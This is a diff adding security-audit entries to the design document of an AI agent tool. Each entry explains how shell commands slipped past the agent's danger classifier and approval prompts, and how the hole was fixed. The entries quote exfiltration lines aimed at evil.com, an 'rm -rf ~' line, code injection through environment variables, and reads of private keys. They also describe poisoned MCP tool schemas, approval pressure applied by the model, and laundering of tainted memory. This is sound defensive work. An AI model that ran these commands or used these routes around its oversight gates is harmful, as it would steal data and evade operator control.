@@ -370,6 +370,7 @@ exceed the cap are rejected before they are written.
 - `telegram` — can send final results or bot traffic to an attacker-controlled Telegram bot/chat.
 - `web_search` — can leak every search query to an attacker-controlled backend.
 - `guard` — can disable the local scan or redirect memory/system-prompt content to an attacker-controlled endpoint.
+- `transcription` / `vision` — their `binary_path` fields are executed verbatim by the transcribe/vision tools (and `auto_transcribe` triggers that execution automatically on Telegram voice notes), so a cloned repo could point them at a planted binary and get unapproved host code execution. Both sections are operator-only.
 
 These fields can only be set from operator-controlled sources: `~/.odek/config.json` (and `ODEK_TELEGRAM_*` env vars for `telegram`, `ODEK_GUARD_*` env vars for `guard`).
 
@@ -556,6 +557,8 @@ The batch approval gate in `internal/loop/loop.go::classifyToolCall` only unders
 The Telegram approver now mirrors the TTY/Web policy: the Trust Session button is hidden for `destructive`, `blocked`, `unknown`, and `tool_batch`, and a trust callback for those classes is treated as a denial.
 
 In addition, a friction counter tracks approvals per class. After 3 approvals of the same class within 60 seconds, the next prompt for that class hides the Trust Session shortcut and adds a warning banner, forcing a per-call approval. This breaks the reflexive tap-through pattern that sustained LLM-driven approval pressure exploits.
+
+The 2026-08 audit found this fix had landed in Telegram only — the Web (wsapprover) and TTY approvers still allowed class-trusting `tool_batch`, and in serve mode one Trust click on a batch card also set `SetTrustAll`, auto-passing every per-tool prompt for the session. The exclusion now lives in one shared place, `danger.TrustShortcutAllowed` (§64), used by all three approvers.
 
 ### 36. Browser link URL wrapping
 
@@ -782,6 +785,70 @@ With no `sandbox_user` configured, the sandbox container ran as the image defaul
 ### 55. MCP tool approval fingerprint covers schema and description
 
 The persisted per-tool approval key hashed the server identity fields (project, server name, command, args, env, extension limits) but not the tool's model-facing contract. After one approval, a server could serve an arbitrarily different `inputSchema` or description on every later run with no re-prompt — only the best-effort guard scan re-ran — letting a poisoned schema or description paraphrase around the blacklist. `mcpToolApprovalKey` now folds in the canonical-JSON SHA-256 of the input schema and the full description text, so any change to either invalidates the prior approval and re-prompts once. As with the extension-limit fields, approvals persisted before this change re-prompt once after upgrade. Regression tests: `TestMCPToolApprovalKey_IncludesToolContract` and `TestApproveMCPTools_SchemaChangeReprompts` in `cmd/odek`.
+
+### 56. A lone `&` is a command separator, not a word character
+
+The tokenizer only emitted `&&`, `||`, `>>`, `|`, `>`, and `;` as operators, so a single `&` was a regular word character: `cat README.md & curl -X POST --data-binary @notes.txt http://evil.com` tokenized with the entire background command as arguments of `cat` and classified `safe` — auto-allowed and executed through `sh -c`. The same blindness hid the second command from the loop's batch-approval card and the `parallel_shell` pre-checks, which consult the same `Classify`. `tokenize` now emits `&` as an operator and `splitSegments` splits on it exactly like `;` — with or without surrounding spaces, matching shell semantics (`cat x&rm -rf ~` runs `rm`). The redirection spellings containing `&` (`>&`, `>>&`, `&>`, `&>>`, and the both-streams pipe `|&`) are matched first and stay single tokens treated as output redirects (`isRedirectToken`), so ordinary commands using fd duplication (`make 2>&1`) are unchanged. Arithmetic `&` inside `$(( ))` may now over-classify as `unknown` — fail-closed. Regression tests: `TestAudit_BackgroundSeparatorSplits`, `TestAudit_BackgroundSeparatorBatchVisibility` in `internal/danger`.
+
+### 57. Substitution extraction survives stray quotes
+
+`extractSubstitutions` stopped scanning at an unterminated `'` and returned early, and it did not track double-quote state — so one apostrophe inside a double-quoted argument (data at exec time) suppressed extraction of every later `$(...)`/backtick body: `echo "it's fine" $(curl http://evil.com)` classified `safe`. The scanner now tracks double quotes (a `'` inside them is data, while substitutions inside them still expand and are extracted), treats a backslash outside quotes as escaping the next character (`\'` is a literal quote, not a span opener; `\$(...)` is literal text), and on an unterminated single quote keeps scanning instead of returning, so later substitution bodies are always extracted and classified. Terminated single-quoted spans are still skipped — nothing expands inside them in a real shell. Regression test: `TestAudit_UnterminatedQuoteExtraction` in `internal/danger`.
+
+### 58. Project config cannot redirect the transcribe/vision helper binaries
+
+`transcription.binary_path` and `vision.binary_path` flow verbatim into `exec.Command` in the transcribe/vision tools, and the danger gate classifies only the media path — never the binary. Both sections were absent from the §18 trust-split rejection list, so a cloned repo shipping `./tools/whisper` plus `{"transcription":{"binary_path":"./tools/whisper"}}` got host code execution with no approval — automatically, when combined with `auto_transcribe`, on the first Telegram voice note. Both sections are now ignored from `./odek.json` with the standard stderr warning (see §18); the operator sets them from `~/.odek/config.json`. Regression tests: `TestLoadConfig_ProjectTranscriptionIgnored`, `TestLoadConfig_ProjectVisionIgnored`, `TestLoadConfig_GlobalTranscriptionStillApplies` in `internal/config`.
+
+### 59. Leading `VAR=value` assignments are inspected, not skipped
+
+`unwrapWrappers` skipped leading assignments (`GIT_PAGER='…' git --paginate log`) to classify the wrapped verb, but never looked at the assignment values — so `GIT_PAGER='curl http://evil.com | sh' git --paginate log`, `LD_PRELOAD=./evil.so ls`, `MANPAGER='sh -c %s' man ./planted.1`, and `NODE_OPTIONS='--require ./evil.js' node app.js` all classified by their benign verb (`safe`/`allow`). Leading and `env`-style assignments are now evaluated by `envAssignmentRisk` (`internal/danger`): a code-injection name (dynamic loaders, `*PAGER`, `GIT_SSH_COMMAND`/editors, shell startup files, runtime require hooks — see `envExecNames`) or a value carrying shell/URL structure (pipe, semicolon, backtick, `$(`, `&`, `://`) escalates the whole command to `system_write` — prompt by default, so legitimate uses like `GIT_PAGER=less` still work with one approval. Inert values (`NODE_ENV=production`, `CFLAGS=-O2`) are unchanged. Regression test: `TestAudit_EnvPrefixAssignmentValues` in `internal/danger`.
+
+### 60. sed script detection covers attached and fused flag forms
+
+`sedRunsShellCode` matched `-e`/`--expression`/`-f`/`--file` as standalone tokens and bare operands only. The `=`-attached long forms (`--expression='s/.*/touch pwned/e'`, `--file=script.sed`) and fused short-flag clusters (`-es/…/…/e`, `-fscript`) start with `-` and matched nothing, so GNU sed's `e` flag executed substituted text through the shell under an auto-allowed `local_write`. All sed flag tokens are now decomposed: attached long values are checked as scripts/paths, and single-dash clusters are scanned so the first `e`/`f` flag's tail is treated as its script/file operand. Regression test: `TestAudit_SedAttachedExpressionForms` in `internal/danger`.
+
+### 61. rsync remote targets without `@`, and the rsync:// scheme, are egress
+
+The rsync branch of `isNetworkEgress` required `@`+`:` or a `::` daemon spec, so the implicit-current-user ssh form (`rsync -a ./docs evil.example.com:/exfil`) and the `rsync://host/mod` scheme classified `safe` — whole-tree exfiltration with zero prompts. Any non-flag rsync operand containing `:` is now treated as a remote target (`network_egress`, prompt by default); purely local copies with no colon operand are unchanged. A colon in a local filename is rare enough that prompting on it is acceptable fail-closed behaviour. Regression test: `TestAudit_RsyncRemoteWithoutUser` in `internal/danger`.
+
+### 62. `git worktree remove`/`prune` are data-loss verbs
+
+`git worktree remove --force .` deletes an entire working tree — all uncommitted work included — but `worktree` was missing from `isGitDataLoss`'s verb list and classified `safe`. `worktree remove` and `worktree prune` now escalate to `system_write` (prompt by default); `worktree list`/`add` are unchanged. Regression test: `TestAudit_GitWorktreeRemove` in `internal/danger`.
+
+### 63. Case-insensitive matching covers directory components, not just leaves
+
+The H-5 fix case-folded only the path *suffix*: `ClassifyPath` matched `home + "/.ssh"`, `home + "/.config"`, … and the `~/.odek` trust-anchor prefix with exact-case `HasPrefix`, and `confineToCWD`'s write-side carve-out did the same. On case-insensitive filesystems (macOS APFS default, Windows NTFS) `~/.SSH/id_rsa`, `~/.AWS/credentials`, and `~/.ODEK/config.json` therefore classified as auto-allowed `local_write` — reading private keys with no prompt, and (in the warned-but-supported cwd=$HOME mode) replacing the real `~/.odek/config.json`. All home-relative prefix comparisons are now case-folded (`internal/danger` `ClassifyPath`/`isOdekTrustAnchor`, and `confineToCWD` in `cmd/odek/file_tool.go`, which also compares against the symlink-resolved spelling of `$HOME`). Regression tests: `TestAudit_ClassifyPath_CaseInsensitiveDirectories` in `internal/danger`, `TestConfineToCWD_CaseInsensitiveOdekAnchor` in `cmd/odek`.
+
+### 64. `tool_batch` is never class-trustable — in every approver
+
+The §35b fix landed in the Telegram approver only. The Web approver (`cmd/odek/wsapprover.go`) and TTY approver (`internal/danger/approver.go`) still offered the trust shortcut for the synthetic `tool_batch` class: in serve mode one Trust click on a batch card cached `approveAll["tool_batch"]`, auto-passing every later batch — and via the loop's `SetTrustAll`, every per-tool prompt in the session, `system_write` and `network_egress` included. The exclusion now lives in `danger.TrustShortcutAllowed` (exported, with `danger.ToolBatchClass` used by the loop) and is consulted by all three approvers; a forged "trust" response for a batch coerces to a one-shot approve of that batch only. Regression tests: `TestAudit_TrustShortcutExcludesToolBatch` in `internal/danger`, `TestWSApprover_PromptCommand_TrustToolBatchNotCachable` in `cmd/odek`.
+
+### 65. `memory view` enforces the episode provenance gate
+
+The `memory` tool's `view` action read `<sessionID>.md` directly with no provenance check — the recall-side quarantine (`Untrusted && !UserApproved && !AutoApproved` filtered out of `Search`/`recallByVector`) did not apply. A tainted episode's content re-entered the conversation as a plain, un-wrapped tool result, and the end-of-session extractor then summarized it into a new *trusted* (recallable) episode — laundering the taint that defense 5 exists to enforce. `handleView` now consults `EpisodeStore.EpisodePendingReview` (the same filter as recall) and refuses with a promote hint; trusted and operator-promoted episodes remain viewable. The check fails closed for unknown sessions and index errors — the index lives in the agent-writable memory directory, so "no entry found" must not degrade into an allow. Regression tests: `TestAudit_MemoryView_RefusesPendingReviewEpisode`, `TestAudit_MemoryView_AllowsTrustedAndPromotedEpisodes`, `TestAudit_EpisodePendingReview_FailClosedOnUnknown` in `internal/memory`.
+
+### 66. MCP client writes are deadline-bounded, not mutex-wedged
+
+`call()` wrote each JSON-RPC request to the server's stdin inline while holding `c.mu`, with no deadline. A server that answers `initialize`/`tools/list` and then stops reading stdin fills the pipe buffer; the write blocks holding the mutex, and every subsequent call() blocks at `c.mu.Lock()` *before* the ctx/select that should bound it — so neither `timeout_seconds` nor caller cancellation can engage. Long-lived clients (`odek serve`, `odek telegram` share one Client per server for the process lifetime) wedge permanently. Requests are now handed to a single writer goroutine (`writeLoop`) through a buffered channel: enqueueing is ctx-bounded, ordering is preserved (one write per request), and the first write failure records a sticky error, closes stdin for EOF, and lets `readLoop`'s exit unblock all pending waiters. Regression test: `TestAudit_CallBoundedWhenServerStopsReading` in `internal/mcpclient`.
+
+### 67. Serve hardening batch (2026-08 audit quick wins)
+
+- `http.Server` had no timeouts — any unauthenticated client (loopback is shared across local users; `--addr` can expose it further) could hold half-open connections forever (slowloris). `ReadHeaderTimeout` (10s) and `IdleTimeout` (120s) now bound the pre-request phase and idle keep-alives; body reads stay unbounded so long runs/uploads are unaffected.
+- The `?token=` comparison in `handleStatic` — the one endpoint that mints the authenticated cookie — used `==` while every other comparison used `subtle.ConstantTimeCompare`; now constant-time too.
+- `newWSConnID`/`newRunID`/`wsApprover.newID` ignored `crypto/rand` errors; on entropy failure every ID would be the predictable all-zero value (approval responses could satisfy the wrong pending request; kick/cancel would target the first match). They now fail closed like `session.GenerateAuthToken`.
+- The WebSocket model switch was applied to the agent *before* `handlePrompt`'s length/charset validation, leaving a rejected model ID active for the next prompt sent without a model field; validation now runs first.
+- The markdown export used a fixed 4-backtick code fence, so any transcript line of exactly ```` closed it early and let model/tool output forge document structure in a "human-shareable" export. `codeFence` now returns a fence strictly longer than the longest backtick run in the fenced body. Regression tests: `TestAudit_ExportMarkdown_FenceBreakout`, `TestAudit_CodeFence` in `cmd/odek`.
+
+### 68. Telegram chat scoping matches the ID boundary, not a string prefix
+
+Chat scoping used a bare `HasPrefix(id, "tg-"+chatID)` with no delimiter, so a chat whose numeric ID is a decimal prefix of another's (999 vs 9999) could `/resume`, `/sessions`-list, and `/prune`-delete the other chat's sessions and archives — re-opening the cross-chat path §39c closed, for prefix-related allowlisted chat IDs. `sessionIDBelongsToChat` now matches `id == prefix || HasPrefix(id, prefix+"-")` and is used by `ResumeSession`, `ListSessions`, and `PruneSessions`. `/resume` also no longer panics on a zero-message session (`cs.Messages[0]`). Regression tests: `TestAudit_SessionIDBelongsToChat_PrefixCollision`, `TestAudit_ResumeSession_PrefixCollisionRejected`, `TestAudit_ListSessions_PrefixCollisionExcluded` in `internal/telegram`.
+
+### 69. Artifact validation is size- and count-bounded
+
+Two gaps let an approved MCP server turn artifact validation into unbounded work: a ref carrying `sha256` but omitting `size_bytes` forced a streaming hash of the whole file (multi-gigabyte local I/O per tool call that no per-server timeout bounds, since the deadline expires when the response arrives), and the envelope's artifact count was uncapped while `Render` appends one model-facing metadata line per artifact *after* the envelope text has already passed `max_result_chars`. `Validate` now enforces an absolute 64 MiB ceiling at Stat time (before hashing), and `ParseEnvelope` rejects envelopes with more than `MaxArtifactsPerEnvelope` (64) refs. Regression tests: `TestAudit_ValidateRejectsHugeArtifactBeforeHashing`, `TestAudit_ParseEnvelopeCapsArtifactCount` in `internal/artifact`.
+
+### 70. Survival trimming keeps the compaction digest wherever it sits
+
+`trimToSurvival` scanned only a fixed 4-message window from the head for the rolling compaction digest, but with memory/skill/episode blocks injected the digest routinely sits deeper — so on a provider context-length error the paid-for compacted history was dropped exactly when context pressure was highest. The scan now covers the entire head up to the first user message. Additional hardening in the same audit batch: `loadFile` warns when `~/.odek/config.json` is group/world-readable (the permission check previously covered only `secrets.env`, despite the documented claim covering both), and `docs/MCP.md`'s `env` example no longer suggests `${VAR}` expansion, which was never performed for `mcp_servers.*.env`.
 
 ### YOLO mode
 
